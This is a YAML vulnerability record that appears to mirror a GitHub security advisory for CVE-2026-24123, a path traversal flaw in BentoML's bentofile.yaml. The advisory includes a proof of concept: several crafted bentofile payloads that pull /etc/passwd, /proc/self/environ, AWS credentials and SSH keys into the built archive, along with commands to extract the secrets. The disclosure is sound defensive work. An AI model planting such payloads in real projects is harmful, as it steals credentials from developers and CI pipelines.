@@ -1,0 +1,403 @@
+advisory_id: GHSA-6r62-w2q3-48hf
+datasource_id: github_osv/GHSA-6r62-w2q3-48hf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-6r62-w2q3-48hf/GHSA-6r62-w2q3-48hf.json
+aliases:
+  - CVE-2026-24123
+summary: |
+  BentoML has a Path Traversal via Bentofile Configuration
+  ### Summary
+
+  BentoML's `bentofile.yaml` configuration allows path traversal attacks through multiple file path fields (`description`, `docker.setup_script`, `docker.dockerfile_template`, `conda.environment_yml`). An attacker can craft a malicious bentofile that, when built by a victim, exfiltrates arbitrary files from the filesystem into the bento archive. This enables supply chain attacks where sensitive files (SSH keys, credentials, environment variables) are silently embedded in bentos and exposed when pushed to registries or deployed.
+
+  ### Details
+
+  The vulnerability exists in how BentoML resolves user-provided file paths without validating that they remain within the build context directory.
+
+  **Vulnerable function** in `src/bentoml/_internal/utils/filesystem.py:114-131`:
+
+  ```python
+  def resolve_user_filepath(filepath: str, ctx: t.Optional[str]) -> str:
+      _path = os.path.expanduser(os.path.expandvars(filepath))
+      if not os.path.isabs(_path) and ctx:
+          _path = os.path.expanduser(os.path.join(ctx, filepath))
+      if os.path.exists(_path):
+          return os.path.realpath(_path)  # No path containment check
+      raise FileNotFoundError(f"file {filepath} not found")
+  ```
+
+  **Vulnerable code** in `src/bentoml/_internal/bento/bento.py:348-355`:
+
+  ```python
+  if build_config.description.startswith("file:"):
+      file_name = build_config.description[5:].strip()
+      if not ctx_path.joinpath(file_name).exists():
+          raise InvalidArgument(f"File {file_name} does not exist.")
+      shutil.copy(ctx_path.joinpath(file_name), bento_readme)  # Path traversal
+  ```
+
+  All four vulnerable fields:
+  - `description: "file:../../../etc/passwd"` → copied to `README.md`
+  - `docker.setup_script: "../../../etc/passwd"` → copied to `env/docker/setup_script`
+  - `docker.dockerfile_template: "../../../secret"` → copied to `env/docker/Dockerfile.template`
+  - `conda.environment_yml: "../../../etc/hosts"` → copied to `env/conda/environment.yml`
+
+  **Multiple path formats are supported, making exploitation trivial:**
+
+  | Format | `description` | `setup_script` | `dockerfile_template` | `environment_yml` |
+  |--------|---------------|----------------|----------------------|-------------------|
+  | Absolute paths (`/etc/passwd`) | Yes | Yes | Yes | Yes |
+  | Tilde expansion (`~/.ssh/id_rsa`) | No | Yes | Yes | Yes |
+  | Env vars (`$HOME/.aws/credentials`) | No | Yes | Yes | Yes |
+  | Relative traversal (`../../../etc/passwd`) | Yes | Yes | Yes | Yes |
+  | Proc filesystem (`/proc/self/environ`) | Yes | Yes | Yes | Yes |
+
+  The `description` field uses `pathlib.Path.joinpath()` directly, while other fields use `resolve_user_filepath()` which calls `os.path.expanduser()` and `os.path.expandvars()`.
+
+  The `/proc/self/environ` vector is particularly dangerous in CI/CD pipelines where secrets are commonly passed as environment variables (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_PASSWORD`, etc.).
+
+  ### PoC
+
+  1. Create a minimal service:
+
+  ```python
+  # service.py
+  import bentoml
+
+  @bentoml.service
+  class TestService:
+      @bentoml.api
+      def predict(self, text: str) -> str:
+          return text
+  ```
+
+  2. Create malicious `bentofile.yaml`. Multiple attack vectors are available:
+
+  **Vector 1: Exfiltrate /etc/passwd via description field**
+  ```yaml
+  service: "service.py:TestService"
+  description: "file:/etc/passwd"
+  ```
+
+  **Vector 2: Exfiltrate all environment variables (CI/CD secrets)**
+  ```yaml
+  service: "service.py:TestService"
+  description: "file:/proc/self/environ"
+  ```
+
+  **Vector 3: Exfiltrate files using environment variable expansion (docker fields only)**
+  ```yaml
+  service: "service.py:TestService"
+  docker:
+    dockerfile_template: "$HOME/.aws/credentials"
+  ```
+
+  **Vector 4: Exfiltrate files using tilde expansion (docker fields only)**
+  ```yaml
+  service: "service.py:TestService"
+  docker:
+    dockerfile_template: "~/.ssh/id_rsa"
+  ```
+
+  Note: The `description` field does not support `~` or `$VAR` expansion. Use absolute paths or relative traversal for `description`. The `docker.*` and `conda.*` fields support all path formats.
+
+  3. Run build:
+
+  ```bash
+  $ bentoml build
+  Successfully built Bento(tag="test_service:abc123").
+  ```
+
+  4. Verify exfiltration:
+
+  ```bash
+  # For description field - check README.md
+  $ cat ~/bentoml/bentos/test_service/abc123/README.md
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  ...
+
+  # For /proc/self/environ - extract CI/CD secrets
+  $ cat ~/bentoml/bentos/test_service/abc123/README.md | tr '\0' '\n' | grep -E "KEY|TOKEN|SECRET"
+  AWS_SECRET_ACCESS_KEY=AKIA...
+  GITHUB_TOKEN=ghp_...
+
+  # For dockerfile_template - check Dockerfile.template
+  $ cat ~/bentoml/bentos/test_service/abc123/env/docker/Dockerfile.template
+  [default]
+  aws_access_key_id = AKIA...
+  aws_secret_access_key = ...
+  ```
+
+  The exfiltrated contents are embedded in the bento archive and will be included in any push, export, or containerization of the bento.
+
+  ### Impact
+
+  **Who is impacted:** Any user who runs `bentoml build` on an untrusted `bentofile.yaml` (e.g., cloned from a malicious repository).
+
+  **Attack scenarios:**
+  - **Supply chain attack:** Malicious contributor adds path traversal to a public ML project; anyone who clones and pushes their built model has their files exfiltrated
+  - **CI/CD environment variable theft:** Using `file:/proc/self/environ`, an attacker can exfiltrate ALL environment variables from the build process. CI/CD pipelines commonly inject secrets this way (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_URL`, etc.), making this a single-payload method to steal all pipeline secrets.
+  - **BentoCloud exfiltration:** When victims push compromised bentos to BentoCloud (`bentoml push`), exfiltrated files are uploaded to the cloud platform. Any user with access to the BentoCloud organization (team members, contractors, or attackers with compromised accounts) can download the bento and extract stolen credentials. This turns BentoCloud into an unwitting exfiltration channel.
+  - **Data theft:** Proprietary source code, configuration files, or database credentials embedded in bentos pushed to shared registries or BentoCloud deployments
+impacted_packages:
+  - purl: pkg:pypi/bentoml
+    affected_versions: vers:pypi/<1.4.34
+    fixed_versions: vers:pypi/1.4.34
+    affected_packages:
+      - pkg:pypi/bentoml@0.0.1
+      - pkg:pypi/bentoml@0.0.2
+      - pkg:pypi/bentoml@0.0.3
+      - pkg:pypi/bentoml@0.0.5
+      - pkg:pypi/bentoml@0.0.6a0
+      - pkg:pypi/bentoml@0.0.7.dev0
+      - pkg:pypi/bentoml@0.0.7
+      - pkg:pypi/bentoml@0.0.8
+      - pkg:pypi/bentoml@0.0.8.post1
+      - pkg:pypi/bentoml@0.0.9
+      - pkg:pypi/bentoml@0.1.1
+      - pkg:pypi/bentoml@0.1.2
+      - pkg:pypi/bentoml@0.2.0
+      - pkg:pypi/bentoml@0.2.1
+      - pkg:pypi/bentoml@0.2.2
+      - pkg:pypi/bentoml@0.3.0
+      - pkg:pypi/bentoml@0.3.1
+      - pkg:pypi/bentoml@0.3.3
+      - pkg:pypi/bentoml@0.3.4
+      - pkg:pypi/bentoml@0.4.0
+      - pkg:pypi/bentoml@0.4.1
+      - pkg:pypi/bentoml@0.4.2
+      - pkg:pypi/bentoml@0.4.3
+      - pkg:pypi/bentoml@0.4.4
+      - pkg:pypi/bentoml@0.4.5
+      - pkg:pypi/bentoml@0.4.7
+      - pkg:pypi/bentoml@0.4.8
+      - pkg:pypi/bentoml@0.4.9
+      - pkg:pypi/bentoml@0.5.0
+      - pkg:pypi/bentoml@0.5.1
+      - pkg:pypi/bentoml@0.5.2
+      - pkg:pypi/bentoml@0.5.3
+      - pkg:pypi/bentoml@0.5.4
+      - pkg:pypi/bentoml@0.5.5
+      - pkg:pypi/bentoml@0.5.6
+      - pkg:pypi/bentoml@0.5.7
+      - pkg:pypi/bentoml@0.5.8
+      - pkg:pypi/bentoml@0.6.0
+      - pkg:pypi/bentoml@0.6.1
+      - pkg:pypi/bentoml@0.6.2
+      - pkg:pypi/bentoml@0.6.3
+      - pkg:pypi/bentoml@0.7.0
+      - pkg:pypi/bentoml@0.7.1
+      - pkg:pypi/bentoml@0.7.2
+      - pkg:pypi/bentoml@0.7.3
+      - pkg:pypi/bentoml@0.7.4
+      - pkg:pypi/bentoml@0.7.5
+      - pkg:pypi/bentoml@0.7.6
+      - pkg:pypi/bentoml@0.7.7
+      - pkg:pypi/bentoml@0.7.8
+      - pkg:pypi/bentoml@0.8.0
+      - pkg:pypi/bentoml@0.8.1
+      - pkg:pypi/bentoml@0.8.2
+      - pkg:pypi/bentoml@0.8.3
+      - pkg:pypi/bentoml@0.8.4
+      - pkg:pypi/bentoml@0.8.5
+      - pkg:pypi/bentoml@0.8.6
+      - pkg:pypi/bentoml@0.9.0rc0
+      - pkg:pypi/bentoml@0.9.0
+      - pkg:pypi/bentoml@0.9.1
+      - pkg:pypi/bentoml@0.9.2
+      - pkg:pypi/bentoml@0.10.0
+      - pkg:pypi/bentoml@0.10.1
+      - pkg:pypi/bentoml@0.11.dev0
+      - pkg:pypi/bentoml@0.11.0
+      - pkg:pypi/bentoml@0.12.0
+      - pkg:pypi/bentoml@0.12.1
+      - pkg:pypi/bentoml@0.13.0
+      - pkg:pypi/bentoml@0.13.1
+      - pkg:pypi/bentoml@0.13.2
+      - pkg:pypi/bentoml@1.0.0.dev0
+      - pkg:pypi/bentoml@1.0.0.dev1
+      - pkg:pypi/bentoml@1.0.0a1
+      - pkg:pypi/bentoml@1.0.0a2
+      - pkg:pypi/bentoml@1.0.0a3
+      - pkg:pypi/bentoml@1.0.0a4
+      - pkg:pypi/bentoml@1.0.0a5
+      - pkg:pypi/bentoml@1.0.0a6
+      - pkg:pypi/bentoml@1.0.0a7
+      - pkg:pypi/bentoml@1.0.0rc0
+      - pkg:pypi/bentoml@1.0.0rc1
+      - pkg:pypi/bentoml@1.0.0rc2
+      - pkg:pypi/bentoml@1.0.0rc3
+      - pkg:pypi/bentoml@1.0.0
+      - pkg:pypi/bentoml@1.0.2
+      - pkg:pypi/bentoml@1.0.3
+      - pkg:pypi/bentoml@1.0.4
+      - pkg:pypi/bentoml@1.0.5
+      - pkg:pypi/bentoml@1.0.6
+      - pkg:pypi/bentoml@1.0.7
+      - pkg:pypi/bentoml@1.0.8
+      - pkg:pypi/bentoml@1.0.9
+      - pkg:pypi/bentoml@1.0.10
+      - pkg:pypi/bentoml@1.0.11
+      - pkg:pypi/bentoml@1.0.12
+      - pkg:pypi/bentoml@1.0.13
+      - pkg:pypi/bentoml@1.0.14
+      - pkg:pypi/bentoml@1.0.15
+      - pkg:pypi/bentoml@1.0.16
+      - pkg:pypi/bentoml@1.0.17
+      - pkg:pypi/bentoml@1.0.18
+      - pkg:pypi/bentoml@1.0.19
+      - pkg:pypi/bentoml@1.0.20
+      - pkg:pypi/bentoml@1.0.21
+      - pkg:pypi/bentoml@1.0.22
+      - pkg:pypi/bentoml@1.0.23
+      - pkg:pypi/bentoml@1.0.24
+      - pkg:pypi/bentoml@1.0.25
+      - pkg:pypi/bentoml@1.1.0
+      - pkg:pypi/bentoml@1.1.1
+      - pkg:pypi/bentoml@1.1.2
+      - pkg:pypi/bentoml@1.1.3
+      - pkg:pypi/bentoml@1.1.4
+      - pkg:pypi/bentoml@1.1.5
+      - pkg:pypi/bentoml@1.1.6
+      - pkg:pypi/bentoml@1.1.7
+      - pkg:pypi/bentoml@1.1.8
+      - pkg:pypi/bentoml@1.1.9
+      - pkg:pypi/bentoml@1.1.10
+      - pkg:pypi/bentoml@1.1.11
+      - pkg:pypi/bentoml@1.2.0a0
+      - pkg:pypi/bentoml@1.2.0a1
+      - pkg:pypi/bentoml@1.2.0a2
+      - pkg:pypi/bentoml@1.2.0a3
+      - pkg:pypi/bentoml@1.2.0a4
+      - pkg:pypi/bentoml@1.2.0a5
+      - pkg:pypi/bentoml@1.2.0a6
+      - pkg:pypi/bentoml@1.2.0a7
+      - pkg:pypi/bentoml@1.2.0rc1
+      - pkg:pypi/bentoml@1.2.0
+      - pkg:pypi/bentoml@1.2.1a1
+      - pkg:pypi/bentoml@1.2.1
+      - pkg:pypi/bentoml@1.2.2
+      - pkg:pypi/bentoml@1.2.3
+      - pkg:pypi/bentoml@1.2.4
+      - pkg:pypi/bentoml@1.2.5
+      - pkg:pypi/bentoml@1.2.6
+      - pkg:pypi/bentoml@1.2.7
+      - pkg:pypi/bentoml@1.2.8
+      - pkg:pypi/bentoml@1.2.9
+      - pkg:pypi/bentoml@1.2.10
+      - pkg:pypi/bentoml@1.2.11
+      - pkg:pypi/bentoml@1.2.12
+      - pkg:pypi/bentoml@1.2.13
+      - pkg:pypi/bentoml@1.2.14
+      - pkg:pypi/bentoml@1.2.15
+      - pkg:pypi/bentoml@1.2.16
+      - pkg:pypi/bentoml@1.2.17
+      - pkg:pypi/bentoml@1.2.18
+      - pkg:pypi/bentoml@1.2.19
+      - pkg:pypi/bentoml@1.2.20
+      - pkg:pypi/bentoml@1.3.0a1
+      - pkg:pypi/bentoml@1.3.0a2
+      - pkg:pypi/bentoml@1.3.0a3
+      - pkg:pypi/bentoml@1.3.0
+      - pkg:pypi/bentoml@1.3.1
+      - pkg:pypi/bentoml@1.3.2
+      - pkg:pypi/bentoml@1.3.3
+      - pkg:pypi/bentoml@1.3.4.post1
+      - pkg:pypi/bentoml@1.3.5
+      - pkg:pypi/bentoml@1.3.6
+      - pkg:pypi/bentoml@1.3.7
+      - pkg:pypi/bentoml@1.3.8
+      - pkg:pypi/bentoml@1.3.9
+      - pkg:pypi/bentoml@1.3.10
+      - pkg:pypi/bentoml@1.3.11
+      - pkg:pypi/bentoml@1.3.12
+      - pkg:pypi/bentoml@1.3.13
+      - pkg:pypi/bentoml@1.3.14
+      - pkg:pypi/bentoml@1.3.15
+      - pkg:pypi/bentoml@1.3.16
+      - pkg:pypi/bentoml@1.3.17
+      - pkg:pypi/bentoml@1.3.18
+      - pkg:pypi/bentoml@1.3.19
+      - pkg:pypi/bentoml@1.3.20
+      - pkg:pypi/bentoml@1.3.21
+      - pkg:pypi/bentoml@1.3.22
+      - pkg:pypi/bentoml@1.4.0a1
+      - pkg:pypi/bentoml@1.4.0a2
+      - pkg:pypi/bentoml@1.4.0
+      - pkg:pypi/bentoml@1.4.1
+      - pkg:pypi/bentoml@1.4.2
+      - pkg:pypi/bentoml@1.4.3
+      - pkg:pypi/bentoml@1.4.4
+      - pkg:pypi/bentoml@1.4.5
+      - pkg:pypi/bentoml@1.4.6
+      - pkg:pypi/bentoml@1.4.7
+      - pkg:pypi/bentoml@1.4.8
+      - pkg:pypi/bentoml@1.4.9
+      - pkg:pypi/bentoml@1.4.10
+      - pkg:pypi/bentoml@1.4.11
+      - pkg:pypi/bentoml@1.4.12
+      - pkg:pypi/bentoml@1.4.13
+      - pkg:pypi/bentoml@1.4.14
+      - pkg:pypi/bentoml@1.4.15
+      - pkg:pypi/bentoml@1.4.16
+      - pkg:pypi/bentoml@1.4.17
+      - pkg:pypi/bentoml@1.4.18
+      - pkg:pypi/bentoml@1.4.19
+      - pkg:pypi/bentoml@1.4.20
+      - pkg:pypi/bentoml@1.4.21
+      - pkg:pypi/bentoml@1.4.22
+      - pkg:pypi/bentoml@1.4.23
+      - pkg:pypi/bentoml@1.4.24
+      - pkg:pypi/bentoml@1.4.25
+      - pkg:pypi/bentoml@1.4.26
+      - pkg:pypi/bentoml@1.4.27
+      - pkg:pypi/bentoml@1.4.28
+      - pkg:pypi/bentoml@1.4.29
+      - pkg:pypi/bentoml@1.4.30
+      - pkg:pypi/bentoml@1.4.31
+      - pkg:pypi/bentoml@1.4.32
+      - pkg:pypi/bentoml@1.4.33
+    fixed_packages:
+      - pkg:pypi/bentoml@1.4.34
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/bentoml/bentoml
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/bentoml/bentoml
+        commit: 84d08cfeb40c5f2ce71b3d3444bbaa0fb16b5ca4
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-6r62-w2q3-48hf/GHSA-6r62-w2q3-48hf.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/bentoml/BentoML
+    reference_type:
+    reference_id:
+  - url: https://github.com/bentoml/BentoML/commit/84d08cfeb40c5f2ce71b3d3444bbaa0fb16b5ca4
+    reference_type:
+    reference_id:
+  - url: https://github.com/bentoml/BentoML/releases/tag/v1.4.34
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-24123
+    reference_type:
+    reference_id: CVE-2026-24123
+  - url: https://github.com/bentoml/BentoML/security/advisories/GHSA-6r62-w2q3-48hf
+    reference_type:
+    reference_id: GHSA-6r62-w2q3-48hf
+exploits: []
